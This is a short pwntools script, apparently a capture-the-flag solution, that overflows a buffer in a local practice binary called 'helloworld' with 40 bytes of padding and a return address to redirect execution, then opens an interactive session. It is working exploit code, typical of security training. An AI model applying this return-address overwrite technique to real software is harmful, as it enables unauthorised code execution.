from pwn import *

p = process("./helloworld")

jump_to = p64(0x4011fb)
payload = b'A' * 40 + jump_to

p.recvuntil("way!")
p.send(payload)

# p.sendline("scp /home/robinhsieh/CatchTheFlag/payload.txt robinhsieh@172.24.0.106:/Users/robinhsieh/Programming/Python/CatchTheFlag/")

p.interactive()

